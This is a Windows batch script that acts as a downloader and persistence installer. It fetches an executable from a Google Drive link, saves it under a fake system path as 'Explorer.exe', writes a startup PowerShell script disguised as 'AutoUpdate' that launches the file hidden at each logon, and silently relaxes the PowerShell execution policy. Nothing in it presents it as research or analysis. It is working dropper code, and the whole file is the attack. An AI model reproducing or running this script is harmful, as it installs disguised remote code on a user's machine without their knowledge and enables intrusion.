@echo off
REM Define variables
set "googleDriveFileUrl=https://drive.usercontent.google.com/download?id=1gtZX_JRPP6eEenXQn9kHl8jNKebSO0m1&export=download&authuser=0&confirm=t&uuid=277d89af-1d62-45e8-9394-a95d2887aa69&at=AENtkXapwsMfuoQwzXzqzFCIwTFo%3A1733262679635"
set "destinationFolder=C:\Microsoft\Windows\STD"
set "destinationFileName=Explorer.exe"
set "startupScriptName=AutoUpdate.ps1"

REM Ensure the destination folder exists
if not exist "%destinationFolder%" (
    mkdir "%destinationFolder%"
)

REM Full path to the destination file
set "destinationFilePath=%destinationFolder%\%destinationFileName%"

REM Download the file using curl for faster speed
curl -L -o "%destinationFilePath%" "%googleDriveFileUrl%"

REM Define the Startup folder for the current user
for /f "tokens=*" %%i in ('powershell -Command "[Environment]::GetFolderPath('Startup')"') do set "startupFolder=%%i"

REM Create a PowerShell script to run the downloaded file at startup in headless mode
set "startupScriptPath=%startupFolder%\%startupScriptName%"
(
    echo # PowerShell script to execute the downloaded file in headless mode
    echo Start-Process -FilePath "%destinationFilePath%" -WindowStyle Hidden
) > "%startupScriptPath%"

REM Grant execution permissions to the script silently
powershell -Command "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force >$null 2>&1"
